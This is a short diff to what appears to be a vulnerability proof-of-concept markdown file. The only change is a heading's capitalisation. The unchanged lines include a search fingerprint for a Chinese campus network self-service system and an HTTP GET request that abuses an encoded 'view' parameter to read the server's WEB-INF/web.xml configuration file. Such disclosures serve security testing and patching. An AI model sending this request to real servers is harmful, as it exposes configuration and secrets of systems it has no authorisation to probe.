@@ -8,7 +8,7 @@
 body="校园网自助服务系统"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /selfservice/selfservice/module/scgroup/web/login_judge.jsf?vie%77=./WEB-INF/web.xml%3F HTTP/1.1
